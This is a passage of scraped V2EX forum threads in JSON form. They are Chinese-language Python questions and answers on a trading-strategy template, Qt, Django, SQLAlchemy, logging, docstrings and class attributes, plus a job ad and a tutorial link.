bar_dict[stock].last &lt; zt\n    \n\n\n\n'''--------------华丽的分割线----------------'''\n\ndef init(context):\n    init_variables(context)\n    choose_target(context)\n\n\n# before_trading 此函数会在每天交易开始前被调用，当天只会被调用一次\ndef before_trading(context, bar_dict):\n    choose_target(context)\n    update_universe(context.stocks)\n    context.his = trans(history(context.obv,'1d','close'))\n    context.barcount = 0\n    context.init = 1\n    pass\n\n\n# 你选择的证券的数据更新将会触发此段逻辑，例如日或分钟历史数据切片或者是实时数据切片更新\ndef handle_bar(context, bar_dict):\n    context.barcount += 1\n    \n    alert_risk(context,bar_dict)\n    \n    #模拟交易第一次开始，如果是交易时间可能运行不了 before_trading,所以这里做了个参数来控制这种出错的特例\n    if context.init == 0:\n        update_universe(context.stocks)\n        context.his = trans(history(context.obv, '1d', 'close'))\n        context.barcount = 0\n        context.init = 1\n    else:\n        pass\n    \n    if context.barcount % 15 == 0:\n        to_sell = for_sell(context, bar_dict)\n        if to_sell:\n            for oid in get_open_orders().keys():\n                cancel_order(oid)\n            for stock in to_sell:\n                order_target_value(stock, 0, style=LimitOrder(bar_dict[stock].last*0.995))\n    \n    if context.barcount == 230:\n        his = trans(history(2,'1m','close'))\n        his = context.his.append(his.iloc[-1,:],ignore_index=True)\n        to_buy = for_buy(context, bar_dict, his)\n        if to_buy:\n            print (to_buy)\n        hnum = len(list(set(to_buy).union(set(context.portfolio.positions.keys()))))\n        for stock in to_buy:\n            if hnum &lt;10:\n                print ('buy', stock, bar_dict[stock].high * 1.005)\n                order_target_percent(stock, 0.99/10, style=LimitOrder(bar_dict[stock].high * 1.005))\n            else:\n                order_target_percent(stock, 0.99/hnum, style=LimitOrder(bar_dict[stock].high * 1.005))\n    \n    if context.barcount == 236: \n        his = trans(history(2,'1m','close'))\n        his = context.his.append(his.iloc[-1,:],ignore_index=True)\n        for_balance(context, bar_dict)\n        for_cash(context, bar_dict)  \n</code></pre>\n<p><img alt=\"\" src=\"http://7xrn7f.com1.z0.glb.clouddn.com/16-11-7/28271032.jpg\"></p>\n<p>新鲜出品： <a href=\"https://www.ricequant.com/community/topic/1150/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/1150/?utm_source=v2ex</a></p>\n</div></div>"], "reply": "1", "tittle": "[策略模板] 一个新手适用的交易策略的模板（分钟回测，过滤涨跌停、停牌……）", "comment": ["这个厉害，已收藏"]},
{"content": ["<div class=\"topic_content\">分享个有意思的教程：基于 OpenCV 的面部特征交换（川普撞脸希拉里） <a target=\"_blank\" href=\"https://www.shiyanlou.com/courses/686\" rel=\"nofollow\">https://www.shiyanlou.com/courses/686</a>\r<br>\r<br>就是通过 OpenCV 库来实现人脸面部特征交换，将第二张人脸的眼睛、鼻子和嘴巴通过程序自动裁剪适配并覆盖到第一张人脸上，并且为了使得修改后的照片看着更加自然，再调整下皮肤颜色。\r<br>教程中的案例用的是川普和希拉里，利用 OpenCV 来实现将希拉里的脸安在川普脸上。\r<br>\r<br>如果被丑到了一定不要来找我，换成你自己的照片试试效果呢……</div>"], "reply": "目前尚无回", "tittle": "基于 OpenCV 的面部特征交换（川普撞脸希拉里）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>qt 富文本排版求助</h1>\n<p>尝试了很久都没能解决，特别做了整理，万望各位不吝赐教！</p>\n<h2>问题</h2>\n<ol>\n<li>如何使用 qt 富文本在同一行中左右分别放置内容</li>\n<li>如何正确的组合 QTextFrame 等内容</li>\n</ol>\n<h2>如何使用 qt 富文本在同一行中左右分别放置内容</h2>\n<p>简而言之，需要在 QLabel 的一行里左对齐放置一些文字，右对齐放置一些文字。</p>\n<p>关于限定 QLabel ：</p>\n<ul>\n<li>由于需要跨 QLabel 选择文字，所以无法使用 layout</li>\n<li>由于之后的内容需要自动折行，所以 paintEvent 也并不容易</li>\n<li>不过 QTextEdit 是可行的</li>\n</ul>\n<p>目前的尝试：</p>\n<ul>\n<li>尝试过使用 qt 支持的<a href=\"http://doc.qt.io/qt-5/richtext-html-subset.html\" rel=\"nofollow\">富文本</a>，没有找到可用的属性（至多使用 div 的 float 属性，在两行中左右放置）</li>\n<li>尝试过使用 qt 的 QTextDocument 等内容在 QTextEdit 中拼接，没有找到可用的方法</li>\n</ul>\n<h2>如何正确的组合 QTextFrame 等内容</h2>\n<p>QTextFrame 等内容在拼接过程中会产生多余的行。</p>\n<p>以以下简化过的需求为例：</p>\n<ul>\n<li>类聊天框，两条信息背景颜色不同</li>\n<li>消息全文左右空出 10px （这是为什么要在 QTextFrame 里面套 QTextBlock 的原因，只是写着不需要实现）</li>\n</ul>\n<p>实现代码基本如下：</p>\n<pre><code>import sys\nfrom PyQt4.QtGui import *\n\nmsgList = ['Hi', 'Hello', 'How are you', 'Fine thank you and you im fine too']\n\napp = QApplication(sys.argv)\n\nted = QTextEdit()\ncursor = ted.textCursor()\nfor i, msg in enumerate(msgList):\n    frameFormat = QTextFrameFormat()\n    frameFormat.setBackground(QColor(227, 239, 255)\n        if i % 2 else QColor(129, 134, 144))\n    blockFormat = QTextBlockFormat()\n    blockFormat.setLeftMargin(10)\n\n    cursor.movePosition(QTextCursor.End)\n    cursor.insertFrame(frameFormat)\n    cursor.insertBlock(blockFormat)\n    cursor.insertText(msg)\n\nmainWindow = QWidget()\nlayout = QVBoxLayout()\nlayout.addWidget(ted)\nmainWindow.setLayout(layout)\nmainWindow.show()\nsys.exit(app.exec_())\n</code></pre>\n<p>产生问题：</p>\n<p>QTextFrame 和 QTextBlock 都会产生一行计划之外的空行，分别对应图中 1 和 2 。</p>\n<p><img alt=\"unexpected-lines\" src=\"http://7xrip4.com1.z0.glb.clouddn.com/v2ex/unexpected-lines.png\"></p>\n<h2>另</h2>\n<p>由于 V2EX 的回复代码的问题，可能要麻烦使用 gist 等方式分享代码。</p>\n<p>使用 c++或者 python 都可以。</p>\n<p>尝试了很久都没能解决，万望各位不吝赐教！</p>\n</div></div>"], "reply": "2", "tittle": "qt 富文本排版求助", "comment": ["转成 html 显示", " 感谢您的回复，可以麻烦简单的贴一下代码吗？\r", "提问前我已经将可以想到的 html 实现都做了尝试，但 qt 的富文本只支持部分的 html4 ，没能找到解决方案。"]},
{"content": ["<div class=\"topic_content\">我现在用利用 VB 来做 python 的 GUI ，之所以不用 Tkinter 是因为这货太麻烦了，还有就是对 VB 感情很深。。。\r<br>但是现在遇到个问题，两者之间的沟通出现了点麻烦。\r<br>我现在是用 VB 外部调用 py 来处理数据，然后把结果显示到 VB 的界面中，沟通的介质是数据库， VB 把需要处理的内容存到表中， py 处理表中的内容，把结果也存到表中，完事以后 VB 再从表中读取展现。流程就是这样。\r<br>我在 VB 端做了个 true 循环，直到表中有内容时才退出循环，显示结果，但是现在的情况，如果 py 在处理过程中报错， VB 端读不到数据，一直就在那等于死循环了。\r<br>我的想法是，给现有 py 端容易出错的地方全加上 try ，出错时把错误代码传到表中， VB 端在循环中读这两个表，读出哪个有内容就做哪个处理。\r<br>需要加 try 的地方有好多，还有的函数套函数套了好几层，加了太多的 try 真是破坏了代码的可读性，除此以外，还有其他 的方法吗？</div>"], "reply": "11", "tittle": "借助 VB 充当 GUI 调用 python，两者之间通信的思考", "comment": ["感觉用本地 socket 通信更合适", "try ?? \r", "你需要学习 Monad\r", "Option/Either 是解决方法。", "pyqt", "你需要的是一整套 RPC 方案。\r", "嗯这样一来你会发现 tkinter 更简洁（", "pyqt 不就可以做图形界面， 还跨平台呢", "这样：你用 vb 直接调用 py ，方法应该很多，比如调用系统命令。\r", "之后， py 执行，执行前给数据库表的某个字段一个状态码，有了结果后修改状态码，如果报错，再存入另一个状态码。\r", "这样的话，你的 vb 就先只取状态码，根据状态码，返回对应的信息", "pyqt 正解，或者 wxWidgets 的 py 绑定。\r", "如果 VB 支持 zmq 的话也可以用 VB + zmq + py 。如果不能用消息队列通信，只能用 socket 或者共享内存的话基本不要想。你会发现你完成这个程序花费的精力都可以学会 QT 了。", " 你说的 Monad ，是针对我提问的哪方面？\r", "是指 “需要加 try 的地方有好多，还有的函数套函数套了好几层，加了太多的 try 真是破坏了代码的可读性” 这个吗？\r", "Monad 我是第一次听说，粗略的看了下，好像就是用若干小函数搭建一个程序，但是我现在就是这样用的啊。", " 对对，现在暂时就用这个方法。", " 是的", "我用 python 多线程建了一个循环读文本的程序，两个线程不好通讯，就建立了一个 lock.lock 的文件，当读取文件的时候就建立此文件，另一个进程监测这个文件，如果有就删除此文件！\r", "\r", "你可以更新数据库某一个字段来间接监控另一个程序，\r", "比如把 pythonrun 字段设置为 1 ， vc 设置为 0 ，当 vc 俩次或者三秒监测字段为 0 ，认为 py 程序不运行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://models.py\" rel=\"nofollow\">models.py</a>\nclass Category(models.Model):\nname = models.CharField(verbose_name=u'文章分类', max_length=64)</p>\n<pre><code>    def __str__(self):\n        return self.name\n\nclass article(models.Model):\n    title = models.CharField(u'标题', max_length=60)\n    category = models.ForeignKey(Category, verbose_name=u'标签', max_length=10, null=True)\n</code></pre>\n<p>在 url 中以分类名作为参数传递给 views 内函数进行过滤行不通</p>\n<pre><code>def Category_list(request, category):\n    try:\n        category_post = article.objects.filter(category_iexact=category)\n    except article.DoesNotExist:\n        raise Http404\n    return render(request, 'category.html', {\"category_post\": category_post})\n</code></pre>\n<p>ValueError at /linux/\ninvalid literal for int() with base 10: 'linux'</p>\n</div></div>"], "reply": "8", "tittle": "django 如何过滤某个分类下的文章", "comment": ["```python\r", "def Category_list(request, category):\r", "    try:\r", "        category_post = article.objects.filter(category__name__iexact=category)\r", "    except article.DoesNotExist:\r", "        raise Http404\r", "    return render(request, 'category.html', {\"category_post\": category_post})\r", "```", " 谢谢大牛 此法可用", " \r", "敢问大神__name     __iexact 这两个字段在哪篇文档里有详解", " ", "官方文档， ", "\r", "你原来的代码中 category_iexact 查询时其实是根据 id 去查询的，要根据 model 的其他属性去查询的话，直接双下划线就属性就可以了。", "原来是这样，看来官方文档要过一遍", "category_post = article.objects.filter(category=category)\r", "\r", "或者 category_post = category.article_set.all()", "传过来的参数是字符串，这里 iexact 的需要是一个 category 对象。"]},
{"content": ["<div class=\"topic_content\"> [岗位职责] \r<br>1 、负责 Python 软件、服务器程序、网站后台设计、相关算法研发和优化；\r<br>2 、参与应用设计与方案讨论；\r<br>3 、负责实现软件、应用程序代码，建立和完善开发文档；\r<br>4 、协助对所开发的功能进行测试，协助产品部署。\r<br>\r<br> [岗位要求] \r<br>1 、熟练掌握 Python 的使用，有一定的 python web 开发经验，熟悉 django 优先；\r<br>2 、至少会使用一种数据库技术，如 Oracle 、 SQL Sever 、 Mysql 、 PostgreSQL 等；\r<br>3 、熟悉 Bootstrap 、 Node.js 、.NET 、 Linux Shell 优先；\r<br>4 、有良好的编程习惯，沟通能力强，能够独自编写技术文档；\r<br>5 、具备较好的学习能力、问题分析能力，可以独立调试并解决问题；\r<br>6 、良好的沟通协调能力和团队合作意识，工作踏实，态度积极，能够承受工作压力。</div>"], "reply": "目前尚无回", "tittle": "上海爱福窝诚聘 Python 开发工程师（ 15-25K） 3+经验", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好让我们 用 ide 写代码的时候，指着调用函数的地方，就可以显示出 每个参数的具体含义，而不是根据参数名来猜测</p>\n</div></div>"], "reply": "3", "tittle": "能给 python 函数的每个参数增加 docstring 吗？", "comment": ["PyCharm 有这功能来着……", " 我一般用的 vs code   pycharm 偶尔用", "1. 在 function 的 docstring 里写, 参考 PEP-257  -> ", "\r", "2. Type Hint, 参考 PEP-484 -> "]},
{"content": "", "reply": "9", "tittle": "想要开始研究 Flask 源码了，有好的文章或者辅助的推荐吗？", "comment": ["官网文档哎", "源码...好吧，请略过上一条和本条。", "研读 Flask v0.0.3 版本", "Pycharm 断点下就好了。。", "建议读 bottle", "我认为 flask 是最好读的程序，然而读完了屁用没有。。。", "最好带着问题去读，而不要盲目的想从头一点点把这个项目的脉络全理清楚，没有必要。框架的东西最好边用边学，花费太大精力去钻牛角尖研究它的实现并不会给你带来太大提升，唯一的收获可能就是写几篇博客。除非你想造一个轮子。程序员还是多想想怎么用代码去解决问题。公司花钱雇你不是让你去读源码的。按需学习，学来即用，立即产出，解决问题，这是我见过的大多数成长较快的同学的特点。如果不是纯粹搞研究或者研究源码实现就是你的 kpi （９９％的人没那个机会）,真要考虑这个时间成本的。", "socketserver→http.server→wsgiref→werkzeug(这个代码很多)→flask\r", "flask 读 0.1 版本就好了， 200 多行\r", "我的博客做了些记录┑(￣Д ￣)┍", " 我也觉得, 碰到问题了有针对性的去看看源码效率会更高一点"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有 3 个 class Class, Student, Homework 。 Class 对 Student 一对多， Student 对 Homework 一对多。</p>\n<p>在 Class 中有 hybrid_property 返回 Class 中的 Homework 并集.</p>\n<pre><code>@hybrid_property\ndef homeworks(self):\n\treturn set([student.homeworks.all() for student in self.students.all()])\n    \n@homeworks.expression\ndef homeworks(cls):\n    return select([distinct(Homework)]).where(and_(Student.class_id == cls.id, Student.homework_id == Homework.id)).as_scalar()\n</code></pre>\n<p>现在想返回某个 Class 的 deadline 在 2016.11.11 的所有 homework 。</p>\n<pre><code>one_class.homeworks.filter(Homework.deadline == traget_date).all()\n</code></pre>\n<p>产生错误 homeworks Set object 没有 filter 方法。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Flask-sqlalchemy hybrid_property 能被 query 吗？", "comment": []},
{"content": ["<div class=\"topic_content\">python 自带的 logging 模块虽然有 timerotate ，但是它是把当前 log 文件重命名，然后再开新文件，这样的话，就容易会出现多 process 冲突的问题！\r<br>所以楼主在上家公司时，是用的从 logging 模块扩展的模块，具体实现是每小时一个日志文件（文件名里包含时间信息），各个 process 都 append 方式打开写入，当前小时的 log 写完了，自动用 append 方式打开下一个日志文件，这样就不存在重命名的问题，也不会有多 process 冲突的问题。\r<br>最近做项目，还是想用这种方式，但是换了东家，原来的代码没找到，所以想网上找，结果一点相关的都没找到，难道就没人这么用的吗？那大家是如何处理写 log ，多 process 的问题呢？都用 sockethandler ，让一个单独的服务去同一写日志？</div>"], "reply": "19", "tittle": "关于 python 写 log 的一个疑问", "comment": ["这就是两种打日志的风格了。\r", "一种是 access.log\r", "一种是 access.log.2016110810\r", "看日志框架的类型了，一般都支持自己滚动日志。\r", "不过一般第一种用的多， op 会自己配置日志切分程序，先 mv 重命名日志，然后再给写日志的进程发一个啥信号，然后程序会自动在原来的位置再起一个新文件打日志。", "python 自带的 TimedRotatingFileHandler 本来就在多进程下有 bug,会误删日志.得自己重写 doRollover 函数", "python 新手请教个问题，生产项目的 log 代码直接写在生产代码里面吗？", "如果是在 Linux 下，可以考虑用 syslog 和 logrotate", "Python 的官方文档有提到这个问题： ", "\r", "\r", "QueueHandler 可以解决这个问题。它是在 Python 3 中加入的； Python 2 中没有，但是也可以搜到类似代码。", "借楼问个问题\r", "一般 python 的 traceback 是出错定位的重要信息。但是一个程序里面 我又不想用 try...  能不能想办法把这个错误信息保存下来。看到具体哪行出错。  是不是除了 2 >&1 没办法了？", " logging 里面的 logger.exception 函数", " 不太明白怎么用...我用 logger  一般都是 try 。。。。 excetion logger.error(\"  xxx error !!\").都是通过 try 然后输出信息的... 所以一旦我的程序后台运行的，某一个我没想到的位置崩溃了。我就看不到 traceback 了.... 能给个例子 说一下 logger.exception 怎么用么", " 啊，我读题没读仔细。。\r", "\r", "logger.exception 函数可以把 traceback 也打印下来。\r", "\r", "但是对于未捕获的异常，你可以修改 sys.excepthook 来自定义行为： ", "\r", "\r", "但是我不确定是不是好的实践。。感觉可以看看 Sentry 怎么做", " 嗯，如果按照我帖子里描述的方法，多进程也是没有问题的，只是我在网上居然没有发现有哪怕一个人是用这种方式的，所以觉得很诧异！因为我的理解，对于中小型项目，这种方法的开发运维成本是最低的！", " @", " 无法预知的 exception 没有必要自己去 try catch ，就让它落到 stderr 就 ok 了，而对于服务端程序这类需要常驻运行的，一般在最外层会捕获异常，并输出的", " 嗯是的，只是 @", " 的场景是他不想去 try catch ，所以可能 sys.excepthook 有作用", "同意上面说的 syslog/rsyslog ，可以很好解决多点写入的问题，这也是大型系统的标准操作吧。", " 只要有新文件产生,append 必然也会有问题,因为问题就出在谁来产生这个新文件这.", "用个 queue 来专门写日志", "试一下 ConcurrentLogHandler \r", " 用 append 的方式 open 文件，应该没问题吧， open 应该是 atomic 操作吧", " ", "\r", "\r", "我前前东家的项目里面刚好也有这个东西，在前前同事们的授意下我给他开源了", " \r", "\r", "---\r", "import logging\r", "import os,os.path\r", "import datetime\r", "\r", "_filefmt=os.path.join(\"logs\",\"%Y-%m-%d\",\"%H.log\")\r", "class MyLoggerHandler(logging.Handler):\r", "    def __init__(self,filefmt=None):\r", "        self.filefmt=filefmt\r", "        if filefmt is None:\r", "            self.filefmt=_filefmt\r", "        logging.Handler.__init__(self)\r", "    def emit(self,record):\r", "        msg=self.format(record)\r", "        _filePath=datetime.datetime.now().strftime(self.filefmt)\r", "        _dir=os.path.dirname(_filePath)\r", "        try:\r", "            if os.path.exists(_dir) is False:\r", "                os.makedirs(_dir)\r", "        except Exception:\r", "            print \"can not make dirs\"\r", "            print \"filepath is \"+_filePath\r", "            pass\r", "        try:\r", "            _fobj=open(_filePath,'a') \r", "            _fobj.write(msg)\r", "            _fobj.write(\"\\n\")\r", "            _fobj.flush()\r", "            _fobj.close()\r", "        except Exception:\r", "            print \"can not write to file\"\r", "            print \"filepath is \"+_filePath"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>学习一下这位程序员如何使用 python 分析数据\n<a href=\"https://www.livecoding.tv/darklord/videos/WK9LJ-python-data-analysis-22\" rel=\"nofollow\">https://www.livecoding.tv/darklord/videos/WK9LJ-python-data-analysis-22</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "使用 python 分析数据", "comment": []},
{"content": ["<div class=\"topic_content\">昨天遇到一个过来给我们普及下 python ，过程中间他提到 python 里的注释会占用更多内存，用三个引号\"\"\"阔起来就不会了\r<br>\r<br>我当时感觉这个说法太过匪夷所思，就问是何缘故，可惜他推说不记得了，只说曾经专门给某公司写了个脚本把所有的注释都用\"\"\"阔起来，当时就是为了避免空间浪费。\r<br>\r<br>下来之后我自己查找 python 的空间消耗一类的文章，未见有此说法。因此到此地找诸位高手求证</div>", "<div class=\"topic_content\">14 楼的仁兄完美解决了该问题</div>"], "reply": "21", "tittle": "[求证] python 的注释会占用内存么？", "comment": ["会啊...__doc__", "应该不占用吧， python 编码为机器码时会忽略注释的内容。", "试试 python -OO", "__doc__应该会，但是你说\"\"\"引用起来不会我就不懂了，等大神解释下？", "看到有不少同学回复说__doc__的话，会占用，但是__doc__是在诸如函数之后的第一个字符串。并不是用#开始的注释。所以应该不是__doc__的原因吧。\r", "\r", "顺便问下我如何才能在顶部补充自己的帖子，而不是回帖额。。。", " APPEND", "1. 不会占用内存\r", "2. 注释占用大量的硬盘空间\r", "3. 注释严重影响载入速度，", "写了个脚本把所有的注释都用\"\"\"阔起来\r", "\r", "这句话明确说明了他说的注释应该是__doc__之类的吧，没人会说因为\"\"\"占内存，所以再加些\"\"\"把他们注释了。", " __doc__本身就是字符串，用\"\"\"括起来也没有啥意思吧\r", "\r", " thanks...", "#开头的不会，反倒是函数和类开头的\"\"\"包起来的会，因为是__doc__。。。\r", "\r", "你说的那位应该是记反了。。。", " 直觉上我觉得你说的靠谱", " 谢谢，我想应该是这么回事\r", "\r", "\r", " 我只看到-O0 选项是“ -O0    Discard docstrings in addition to the -O optimizations.” 没看见-OO 是干啥的呢", " 会把 .py 编译成 .pyo ，然而没啥用", "这个问题蛮有意思，我测试了一下：\r", "1. 被 import 的函数没有注释，没有__doc__，进程启动后 RSS 4396KB\r", "2. 被 import 的函数带有~16MB 左右的注释，没有__doc__，进程启动后 RSS 4396KB\r", "3. 被 import 的函数没有注释，带有~16MB 的__doc__，进程其启动后 RSS 20036KB\r", "4. 被 import 的函数没有注释，没有__doc__，但是内部有一个没有使用到的~16MB 的 str 对象（不管是\"\"\"还是\"引起来），进程启动后 RSS 20036KB\r", "5. 第四步的基础上，调用一次 gc.collect()，然后再统计进程内存使用，发现 RSS 4400KB\r", "\r", "\r", "所以我觉得 9hills 的猜测是对的，那位记反了：用\"\"\"的方式注释掉一段代码其实只是把它变成一个没有引用的 str 对象，还是占着内存的，#的方式注释才是真正的注释。\r", "\r", "不过从第 5 步的测试结果来看，\"\"\"方式的注释生成的只是一个没有引用的 str 对象， gc 的时候是可以回收掉的。", " 赞认真的态度", " 太感谢了，我还正在考虑找个 linux 环境，用进程内存来看大小呢，您就解决了。\r", "看步骤，似乎 python 有自己查看内存大小的功能，但是我直接搜索\"python rss\"，一无所获。能说明下关键词一类的麽，谢谢", "上机测试一下不就知道了啊", " centos 上，查看 /proc/<pid>/status 文件，里面的 VmRSS 就是进程的物理内存使用量", " 哦，谢谢\r", "\r", "\r", " 我突然想到其实在 win 下也可以用任务管理器看内存…之前老去想找个 linux 环境做试验…是我蠢了", "我觉得，你肯能弄反了， 注释不会， docstring 会。\r", "首先 docstring 不是注释，其次既然你在运行时，是可以获取 docstring 的，那么显然 docstring 没有被忽略。", " 赞"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>用 Python 来实现这个算法，可以先构造一个从 3 开始的奇数序列：</p>\n</blockquote>\n<pre><code>def _odd_iter():\n    n = 1\n    while True:\n        n = n + 2\n        yield n\n</code></pre>\n<blockquote>\n<p>注意这是一个生成器，并且是一个无限序列。</p>\n</blockquote>\n<blockquote>\n<p>然后定义一个筛选函数：</p>\n</blockquote>\n<pre><code>def _not_divisible(n):\n    return lambda x: x % n &gt; 0\n</code></pre>\n<blockquote>\n<p>最后，定义一个生成器，不断返回下一个素数：</p>\n</blockquote>\n<pre><code>def primes():\n    yield 2\n    it = _odd_iter() # 初始序列\n    while True:\n        n = next(it) # 返回序列的第一个数\n        yield n\n        it = filter(_not_divisible(n), it) # 构造新序列\n这个生成器先返回第一个素数 2 ，然后，利用 filter()不断产生筛选后的新的序列。\n</code></pre>\n</div></div>"], "reply": "26", "tittle": "廖雪峰 python 教程的有 2 个地方看不懂", "comment": ["然后呢，哪 2 个地方不懂？", "习惯了 ctrl+enter 换行, 不小心发出去了.\r", "\r", "我的两个疑问:\r", "1.  _not_divisible(n) 函数里的 lambda 中 x 的值从哪里传进去的?\r", "2. `  it = filter(_not_divisible(n), it) # 构造新序列`\r", "这行里 it 是一个生成器,  直接传给 filter 函数, filter 如何获取的值, filter 不是接受一个列表作为参数吗?", " filter(function, iterable)，传入一个函数和一个可迭代对象。", "这种时候我就超想安利 Ruby …", "filter 接受一个函数和一个数组，所以这里的 x 是数组传入的， n 是前面赋值的序列第一个数", "1.关键就是,  return lambda x: x % n > 0.  it 就是 x 参数\r", "2,filter(function or None, iterable)", " 谢谢, 我搞明白了.\r", "\r", "filter([fn],iterable)\r", "\r", "这里面给它传的是_odd_iter, 一个迭代器, filter 返回的也是一个迭代器对象,\r", "\r", "而\r", "```\r", "def _not_divisible(n):\r", "    return lambda x: x % n > 0\r", "```\r", "这里 lambda 的参数 x 接收的是迭代器当前值, 不是 n 的值. 这里是个闭包 ,_not_divisible(n)的执行结果作为 filter 的参数.", "可以参考 ", "\r", "filter 接收的第二个参数就是 iterable object,返回的依然是个 iterable object.知道这个就好理解多了。", " 对迭代器不熟, 思路总是停留在数组上", "我感觉，会用 map 就行了，反正我没用过 reduce 和 filter", "相当于 it 外面不断套了很多层_not_divisible(p)？其中 p 是>=3 ，<当前 n 的素数。 sieve of Eratosthenes ？", "只要想到这里的 filter 其实是 itertools.ifilter 就明白了", "你需要看的是这个\r", "\r", "正统的教程（ sicp 的 python 版本）\r", "而不是啥都提一点点的  （*** python 教程）", " \r", "好书, 重新学下程序基础结构.不过覆盖面挺广, 内容却不多, 不知道有没有配套的公开课什么的.\r", "谢谢", " xx 教程所谓的内容广就是讲各种库的 helloword 用法。。实际上水分大\r", "sicp 上面的内容很丰富的", "  孤陋寡闻了, 这书原来这么有名, 资源还不少,\r", "xx 教程学起来容易, 但是遗患较深. 有体会.", " 习惯了 enter 换行，微信上总是想换行时按一下 enter 键就把消息发出去了。。。", " Electronic WeChat ，没找到在哪里修改快捷键。", " 紫魔法书 链接是 python 版本的，虽然没有原来的深入，但是也很丰富了", " 注意到了,原版是 mit 写的吧, 用的 scheme, 中文版是 90 年代的第二版, 您发的链接是 0 几年的伯克利改编的 python 版.\r", "\r", "突然有种想重新学数学的冲动. ╮(╯▽╰)╭.", " 和数学没啥关系， 不要听别人瞎扯", " 给作者做过助教的飘过 这书 berkeley 没人看... 都直接学 61a...", " 这不就是 61a 的教科书吗？", " 但是没人看 我学 61a 的时候没人看 教 61a 的时候更没人看...", " 61a 自己的 lab/disc 写的太好（嘿嘿嘿都靠我们助教也）了 这个教科书太无聊了 所以...", " 好厉害。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>code1</p>\n<pre><code>class Foo(object):\n    x = 1.5\n\nfoo = Foo()\n\nprint Foo.x  # 值为 1.5 类属性\nprint foo.x  # 值为 1.5 ，实例属性(在实例属性没有的情况下，使用类属性)\n\nfoo.x = 1.7\nprint foo.x  # 实例属性\nprint Foo.x  # 实例属性的修改不会影响类属性(实例属性可以有效屏蔽类属性)\n</code></pre>\n<p>code2</p>\n<pre><code>#!/usr/bin/env python\n# coding=utf-8\n\n\nclass Foo(object):\n    x = {1: 'hello'}\n\nfoo = Foo()\nprint foo.x # 值为{1: 'hello'}\nprint Foo.x # 值为{1: 'hello'}\n\nfoo.x[1] = 'world'\nprint foo.x # 值为{1: 'world'}\nprint Foo.x # 值为{1: 'world'}\n</code></pre>\n<p>问题：\n为什么第一个代码段当类属性是不可变对象时(数字），修改实例属性，不会影响到类属性\n而第二个代码段中，当类属性是可变对象时（字典)，修改实例属性，导致类属性也改变了？</p>\n</div></div>"], "reply": "9", "tittle": "请教大家关于 python 类属性和实例属性的问题，谢谢！", "comment": ["这儿跟可变对象和不可变对象没啥关系;\r", "类属性被所有实例共享, 实例都是从某个类(相当于模板)造出来的; 实例属性可各不相同, 还可以动态添加删除\r", "\r", "这里是 foo.x=1.7 这种赋值方式的问题, 这会给实例动态添加一个(实例)属性 x, 跟类属性 x 不同\r", "比如 print foo.y 会抛出 AttributeError, 但 foo.y=1 会动态添加一个实例属性 y\r", "\r", "修改类属性用类名访问 Foo.x=2, 所有实例读取 x 属性时都是一样的值.(前提是没有被实例属性覆盖)\r", "\r", "class Cls(object):\r", "    x = 1\r", "\r", "c1 = Cls()\r", "c2 = Cls()\r", "print c1.x  # 1\r", "print c2.x  # 1\r", "\r", "Cls.x = 2\r", "print c1.x  # 2\r", "print c2.x  # 2\r", "\r", "c1.x = 233\r", "print c1.x  # 233, 先得到实例属性 \r", "print c2.x  # 2\r", "print Cls.x  # 2", "实例属性跟类属性是放在不同的字典里面的, print c1.x, c1.x = 233 这种操作就是字典操作\r", "print c1.__dict__\r", "print Cls.__dict__", "楼上说的很对，实例属性跟类属性是放在不同的字典里面的。\r", "foo 实例有两个字典: \r", "1 、实例的字典 foo.__dict__    \r", "2 、类的字典 foo.__class__.__dict__", "'''python\r", "#coding:utf-8\r", "\r", "class Foo(object):\r", "    x = {1:'hello'}\r", "    \r", "\r", "foo = Foo()\r", "\r", "foo.x[1] = 'world'\r", "print(foo.__dict__)\r", "'''\r", "输出：\r", "{}\r", "说明， foo.x[1] = 'world'，根本没有创建一个实例属性", " \r", "所以说楼主 code2 代码现象的原因是： foo.x[1] = 'world'  ，因为 foo 实例本身没有实例属性 x ，且没有 x[1] = 'world' 创建变量的语法，所以 foo.x[1] = 'world' 修改了类属性 Foo.x\r", "\r", "不知是不是这么理解？", "继续引发一点思考\r", "\r", "```python\r", "#coding:utf-8\r", "\r", "class Foo(object):\r", "    x = {1:'hello'}\r", "    \r", "\r", "foo = Foo()\r", "\r", "foo.x = {1:'world'}\r", "\r", "print(foo.x)\r", "print(Foo.x)\r", "\r", "\r", "```\r", "\r", "输出：\r", "{1: 'world'}\r", "{1: 'hello'}", "我感觉上面各位都有些偏题了，造成这个现象的原因的确如楼主所说：字典是可变对象。\r", "首先“实例属性的修改不会影响类属性”的确是对的\r", "在实例属性没有的情况下，使用类属性，所以实例与类的 x 都是对那个字典的引用\r", "但是 code2 中 foo.x[1] = 'world' 根本就**没有**修改或者创建实例属性，是 foo.x 的引用那个字典里的值被改变了， foo.x 的引用没变。然后因为实例与类的 x 都是对那个字典的引用，所以值相同", " 感谢！", " 是的，例子很有说服力，一看就懂！"]},
